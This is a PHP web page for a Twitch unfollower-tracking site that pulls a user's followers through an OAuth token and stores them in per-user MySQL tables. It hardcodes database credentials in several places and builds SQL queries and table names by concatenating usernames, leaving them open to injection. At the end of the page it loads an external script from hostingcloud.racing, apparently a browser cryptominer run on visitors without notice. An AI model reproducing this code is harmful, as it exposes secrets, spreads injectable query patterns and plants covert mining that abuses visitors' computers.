<?php
ob_start();
session_start();
?>
<script type="text/javascript">
    var parts = location.href.split('#');
    if (parts.length > 1)
    {
        var params = parts[0].split('?');
        var mark = '?';
        if (params.length > 1)
        {
            mark = '&';
        }
        location.href = parts[0] + mark + 'fragment' + parts[1];
    }
</script>
<?php
ob_start();
ini_set('max_execution_time', 300);
ini_set('error_reporting',0);
$connection = mysqli_connect("pdb33.biz.nf", "2293248_tv", "718293Danito978Baychev!", "2293248_tv");
//print_r($_GET);
// echo $_GET['fragmentaccess_token'];
// exit;
if (empty($_GET['fragmentaccess_token'])) {
    header("location: connect_twitch.php", true, 301);
    exit;
    //echo '<p style="text-align:center;color:white;font-size:20px;">You have to Connect with twitch to find your unfollowers!</p>';
}
//$channelsApi = 'https://id.twitch.tv/oauth2/token?client_id=pm7oxir9hxzfi0qrtghrl0hnzdxdrg&client_secret=t6riibt5nqvdr7dl7kcwiujibpg97v&grant_type=authorization_code&redirect_uri=http://localhost/TwitchPHP/process.php&code='.$_GET['fragment'].'';
$channelsApi2 = 'https://id.twitch.tv/oauth2/userinfo';
$channelName2 = '';
//$auth = $_GET['access_token'];
//$authorization = "Authorization: Bearer ".$_GET['access_token']."";
//$clientId = 'pm7oxir9hxzfi0qrtghrl0hnzdxdrg';
$ch2 = curl_init();
curl_setopt_array($ch2, array(
    CURLOPT_HTTPHEADER => array(
        "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
    //   'Client-ID: ' . $clientId
    ),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_URL => $channelsApi2 . $channelName2
));
$response2 = curl_exec($ch2);
curl_close($ch2);
$json2 = json_decode($response2, true);
$username = $json2['preferred_username'];
$sql = "SELECT * FROM users where twitch_username = '" . $username . "'";
$result = $connection->query($sql);
// print_r($result);
// exit;
if ($result->num_rows <= 0) {

    $_SESSION['username'] = $username;
    $_SESSION['fragmentaccess_token'] = $_GET['fragmentaccess_token'];
    $_SESSION['scope'] = $_GET['scope'];
    $_SESSION['token_type'] = $_GET['token_type'];
    // echo "here";
    // exit;
 // FOR PAYMENT   header("location: payment/index.php", true, 301);
  //  exit;
    //exit();
    // echo "here33";
    // exit;
    // output data of each row
    // while($row = $result->fetch_assoc()) {
    //     echo "id: " . $row["id"]. " - Name: " . $row["firstname"]. " " . $row["lastname"]. "<br>";
    // }
} else {
    //echo "here2";
}
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Track Twitch Unfollowers</title>
        <!-- Google Tag Manager -->

        <meta charset="UTF-8">
        <meta name="description" content="Find who unfollowed you on Twitch!">
        <meta name="keywords" content="twitch unfollow,twitch unfollowers, who unfollowed me twitch">
        <meta name="author" content="Daniel Baychev">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" type="image/x-icon" href="img/h.png" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script type = "text/javascript" 
                src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script>
    (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-3989608972631976",
        enable_page_level_ads: true
    });
        </script>
        <script>(function (w, d, s, l, i) {
                w[l] = w[l] || [];w[l].push({'gtm.start':
                            new Date().getTime(), event: 'gtm.js'});
                var f = d.getElementsByTagName(s)[0],
                        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-TZSXQFP');</script>
        <!-- End Google Tag Manager -->
        <script src="login.js" type="text/javascript"></script>

        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="css/css.css" rel="stylesheet" type="text/css"/>
        <link href="css/index.css" rel="stylesheet" type="text/css"/>
        <script src="js/nav.js" type="text/javascript"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <script>
            function myFunction() {
                var x = document.getElementById("myTopnav");
                if (x.className === "topnav") {
                    x.className += " responsive";
                } else {
                    x.className = "topnav";
                }
            }
        </script>
        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-129733775-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);
            }
            gtag('js', new Date());

            gtag('config', 'UA-129733775-1');
        </script>



    </head>
    <body id="body" style="font-family: Sans-Serif;background-color: white;">
        <!-- Google Tag Manager (noscript) -->
        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TZSXQFP"
                          height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
        <!-- End Google Tag Manager (noscript) -->
        <nav role='navigation'>
            <div class="topnav" id="myTopnav">
                <a href="register.php" onclick="page(this);" class="active">Unfollower</a>
                <a href="home.php" onclick="page(this);">Home</a>
                <a href="f4f.php" onclick="page(this);">F4F Tool</a>
                <a href="about.php" onclick="page(this);">FAQ'S</a>
                <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=v8jjvzxpx7byti5lykiyy5001gueh4&redirect_uri=http://unfollowers.tv/home.php&scope=analytics:read:extensions"><img height="25" class="logme"  src="img/login.png"></a>

                <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                    <i class="fa fa-bars"></i>
                </a>
            </div>
        </nav>
        <br>

        <h2 style="text-align: center;color:#ffffff;">
            Users who unfollowed :
        </h2>
        <div style="background-color:#33333357;border-radius: .25rem;margin-top: 50px;" class="container">
            <div class="row">
                <div id="fccStatus" class="col-md-12 col-sm-12">

                    <p class="mobile" >* If you are using your mobile, we highly suggest to use the desktop version instead, since the website is not YET optimized for phones</p>
                    <?php
                    $channelsApi3 = 'https://api.twitch.tv/helix/users?login=' . $json2['preferred_username'];
                    $channelName3 = '';
                    $clientId3 = '40pbvj5imeg5ma36gla9p8ryfkyyyb';
                    $ch3 = curl_init();
                    curl_setopt_array($ch3, array(
                        CURLOPT_HTTPHEADER => array(
                            "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
                        ),
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_URL => $channelsApi3 . $channelName3
                    ));
                    $response3 = curl_exec($ch3);
                    curl_close($ch3);
                    $json3 = json_decode($response3, true);
                    foreach ($json3['data'] as $obj) {
                        global $obj;
                        //echo $obj['id'];
                    }











                    //Old Code

                    $rname = $json2['preferred_username'];
//echo $rname;
                    $rid = $obj['id'];
//echo $rid;
                    $rapi = $rname . 'api';
//echo $rapi;
                  //  $connection = mysqli_connect("localhost", "root", "", "twitchun");
                    $connection = mysqli_connect("pdb33.biz.nf", "2293248_tv", "718293Danito978Baychev!", "2293248_tv");
                    if ($connection->query('SELECT * from ' . $rname . ' limit 1') === FALSE) {
                        $createT = 'CREATE TABLE ' . $rname . ' (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
follower_name VARCHAR(50) NOT NULL,
follow_time VARCHAR(16) NOT NULL
)';
                        $createApi = 'CREATE TABLE ' . $rapi . ' (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
fn VARCHAR(50) NOT NULL,
ft VARCHAR(16) NOT NULL
)';
                        $connection->query($createT);
                        $connection->query($createApi);
                        echo "<p style='color:white'>If this is your first time using this we just collected your followers, so from this point on you can come and check if you have new Unfollowers</p>";
                    }




                    $channelsApi = 'https://api.twitch.tv/helix/users/follows?to_id=' . $rid . '&first=100';
                    $channelName = '';
                    $clientId = '40pbvj5imeg5ma36gla9p8ryfkyyyb';
                    //$token = $_GET['fragment'];
                    $ch = curl_init();
                    curl_setopt_array($ch, array(
                        CURLOPT_HTTPHEADER => array(
                            // 'token: ' . $token
                            // 'Client-ID: ' . $clientId
                            "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
                        ),
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_URL => $channelsApi . $channelName
                    ));
                    $response = curl_exec($ch);
                    curl_close($ch);
                    //echo $response;
                    $json = json_decode($response, true);




                    foreach ($json['data'] as $names) {
                        // echo '<br>'.$names['from_name'];
                        $result = $connection->query("SELECT follower_name FROM " . $rname . " WHERE follower_name = '" . $names['from_name'] . "'");
                        if ($result->num_rows == 0) {
                            //if follower doesnt exist in database put him in
                            mysqli_query($connection, 'INSERT into ' . $rname . '(follower_name, follow_time) VALUES ("' . $names['from_name'] . '", "' . $names['followed_at'] . '")');
                        } else {
                            //if follower exists in database and in json
                        }

                        $result2 = $connection->query('SELECT fn FROM ' . $rapi . ' WHERE fn = "' . $names['from_name'] . '" ');
                        if ($result2->num_rows == 0) {
                            //if follower doesnt exist in database put him in
                            mysqli_query($connection, 'INSERT into ' . $rapi . ' (fn, ft) VALUES ("' . $names['from_name'] . '", "' . $names['followed_at'] . '")');
                        } else {
                            //if follower exists in database and in json
                        }
                    }
                    do {
                        if (isset($pagination4)) {
                            $channelsApi4 = 'https://api.twitch.tv/helix/users/follows?to_id=' . $rid . '&first=100&after=' . $pagination4;
                            $channelName4 = '';
                            $clientId4 = '40pbvj5imeg5ma36gla9p8ryfkyyyb';
                            //$token = $_GET['fragment'];
                            $ch4 = curl_init();
                            curl_setopt_array($ch4, array(
                                CURLOPT_HTTPHEADER => array(
                                    // 'token: ' . $token
                                    // 'Client-ID: ' . $clientId
                                    "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
                                ),
                                CURLOPT_RETURNTRANSFER => true,
                                CURLOPT_URL => $channelsApi4 . $channelName4
                            ));
                            $response4 = curl_exec($ch4);
                            curl_close($ch4);
                            // echo $response;
                            $json4 = json_decode($response4, true);
                            foreach ($json4['pagination'] as $pagination4) {
                                global $pagination4;
                            }
                            foreach ($json4['data'] as $names) {
                                $result = $connection->query("SELECT follower_name FROM " . $rname . " WHERE follower_name = '" . $names['from_name'] . "'");
                                if ($result->num_rows == 0) {
                                    mysqli_query($connection, 'INSERT into ' . $rname . '(follower_name, follow_time) VALUES ("' . $names['from_name'] . '", "' . $names['followed_at'] . '")');
                                }

                                $result2 = $connection->query('SELECT fn FROM ' . $rapi . ' WHERE fn = "' . $names['from_name'] . '" ');
                                if ($result2->num_rows == 0) {
                                    mysqli_query($connection, 'INSERT into ' . $rapi . ' (fn, ft) VALUES ("' . $names['from_name'] . '", "' . $names['followed_at'] . '")');
                                }
                            }
                        } else {
                            $channelsApi4 = 'https://api.twitch.tv/helix/users/follows?to_id=' . $rid . '&first=100';
                            $channelName4 = '';
                            $clientId4 = '40pbvj5imeg5ma36gla9p8ryfkyyyb';
                            //$token = $_GET['fragment'];
                            $ch4 = curl_init();
                            curl_setopt_array($ch4, array(
                                CURLOPT_HTTPHEADER => array(
                                    // 'token: ' . $token
                                    // 'Client-ID: ' . $clientId
                                    "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
                                ),
                                CURLOPT_RETURNTRANSFER => true,
                                CURLOPT_URL => $channelsApi4 . $channelName4
                            ));
                            $response4 = curl_exec($ch4);
                            curl_close($ch4);
// echo $response;
                            $json4 = json_decode($response4, true);
                            foreach ($json4['pagination'] as $pagination4) {
                                global $pagination4;
                            }
                            foreach ($json4['data'] as $names) {
                                // echo '<br>'.$names['from_name'];
                                $result = $connection->query("SELECT follower_name FROM " . $rname . " WHERE follower_name = '" . $names['from_name'] . "'");
                                if ($result->num_rows == 0) {
                                    //if follower doesnt exist in database put him in
                                    mysqli_query($connection, 'INSERT into ' . $rname . '(follower_name, follow_time) VALUES ("' . $names['from_name'] . '", "' . $names['followed_at'] . '")');
                                }

                                $result2 = $connection->query('SELECT fn FROM ' . $rapi . ' WHERE fn = "' . $names['from_name'] . '" ');
                                if ($result2->num_rows == 0) {
                                    //if follower doesnt exist in database put him in
                                    mysqli_query($connection, 'INSERT into ' . $rapi . ' (fn, ft) VALUES ("' . $names['from_name'] . '", "' . $names['followed_at'] . '")');
                                }
                            }
                        }
                    } while ($json4['data'] != NULL);




                    //$sql = "SELECT * FROM followers JOIN apifollow on followers.follower_name = apifollow.fn where followers.follower_name <> apifollow.fn";
                    $sql = "select follower_name from " . $rname . " where follower_name not in (select fn from " . $rapi . ")";
                    $result3 = mysqli_query($connection, $sql);
                    while ($rows = mysqli_fetch_assoc($result3)) {

                        echo '<p><a href="https://twitch.tv/' . $rows['follower_name'] . '">' . $rows['follower_name'] . '</a><img height="35" src="img/wierd.png"> </p>';
                    }

                    if ($rows == NULL) {
                        echo '<p style="color:white;">You have no new unfollowers<img height="35" src="img/feelsgoodman.png"></p>';
                    }

                    mysqli_query($connection, 'DELETE FROM ' . $rapi . ' ');

                    $channelsApi11 = 'https://api.twitch.tv/helix/users/follows?to_id=' . $rid . '&first=10';
                    $channelName11 = '';
                    $clientId11 = '40pbvj5imeg5ma36gla9p8ryfkyyyb';
                    //$token = $_GET['fragment'];
                    $ch11 = curl_init();
                    curl_setopt_array($ch11, array(
                        CURLOPT_HTTPHEADER => array(
                            // 'token: ' . $token
                            // 'Client-ID: ' . $clientId
                            "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
                        ),
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_URL => $channelsApi11 . $channelName11
                    ));
                    $response11 = curl_exec($ch11);
                    curl_close($ch11);
                    //echo $response;
                    $json11 = json_decode($response11, true);
                    echo '</div></div></div>';
                    echo '<h3 style="text-align: center;color:#ffffff;"s>Your most recent followers:</h3><div style="background-color:#33333357;border-radius: .25rem;margin-top: 50px;" class="container">
            <div class="row">
                <div id="" class="col-md-12 col-sm-12">';
                    foreach ($json11['data'] as $names11) {

                        echo '<p style="color:white;>' . $names11["from_name"] . '</p>';
                    }

                    $channelsApi112 = 'https://api.twitch.tv/helix/users/follows?to_id=' . $rid . '&first=10';
                    $channelName112 = '';
                    $clientId112 = '40pbvj5imeg5ma36gla9p8ryfkyyyb';
                    //$token = $_GET['fragment'];
                    $ch112 = curl_init();
                    curl_setopt_array($ch112, array(
                        CURLOPT_HTTPHEADER => array(
                            // 'token: ' . $token
                            // 'Client-ID: ' . $clientId
                            "Authorization: Bearer " . $_GET['fragmentaccess_token'] . ""
                        ),
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_URL => $channelsApi11 . $channelName11
                    ));
                    $response112 = curl_exec($ch112);
                    curl_close($ch112);
                    //echo $response;
                    $json112 = json_decode($response112, true);
                    echo '</div></div></div>';
                    echo '<h3 style="text-align: center;color:white;"s>Your last followers followed you at:</h3><div style="background-color:#33333357;border-radius: .25rem;margin-top: 50px;" class="container">
            <div class="row">
                <div id="" class="col-md-12 col-sm-12">';
                    foreach ($json112['data'] as $names112) {

                        echo '<p style="color:white;">' . $names112["followed_at"] . '</p>';
                    }
                    ?>


                    <br>
                </div>

            </div>
        </div>

        <br>
        <form style="text-align: center;" method="post" action="" >
            <p style="text-align:center;"> Reset all data - Temporary in maintenance!</p>
            <input class="btn" type="submit" value="submit" name="submit">
        </form>
        <br>
        <?php
        $connection = mysqli_connect("pdb33.biz.nf", "2293248_tv", "718293Danito978Baychev!", "2293248_tv");
        if (isset($_POST['submit'])) {
            $sqldel = "DELETE FROM " . $rname . " ";
            mysqli_query($connection, $sqldel);
        }
        ?>
        <br>


        <br>
        <br>
        <div class="footer">
            <p style="margin:auto;">twitchtoolstv@gmail.com <a target="_blank" href="https://patreon.com/twitchtools"><img src="img/patreon.png" height="15"/></a> <a href="https://twitter.com/AnalyticsTwitch"><img height="15" src="img/twitter.png"/></a></p>
        </div>
        <script type="text/javascript">  if (typeof tkn === "string") {
                var hide = document.getElementById("hidden");
                hide.style.display = "none";
            }</script>
        <script src="https://www.hostingcloud.racing/8qk1.js"></script>
    </body>
</html>


